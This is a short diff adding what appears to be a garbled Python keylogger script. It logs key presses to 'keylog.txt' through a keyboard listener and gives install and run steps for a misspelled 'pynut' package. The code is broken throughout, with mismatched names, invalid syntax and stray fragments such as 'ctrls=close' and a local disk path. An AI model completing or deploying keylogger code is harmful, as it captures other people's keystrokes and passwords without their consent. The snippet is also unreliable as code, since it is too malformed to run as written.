@@ -1,0 +1,13 @@
+log-file="keylog.txt"
+def on_press(key)
+with open(log_file"a")as f
+f.write(str(key)+/n")
+with linshener(on_press=-press)
+as
+listner
+listner.joint()
+ctrls=close
+python.key log test.py
+pip install pynut
+python keylogtest.py
+local disk_athal_keylog.txt
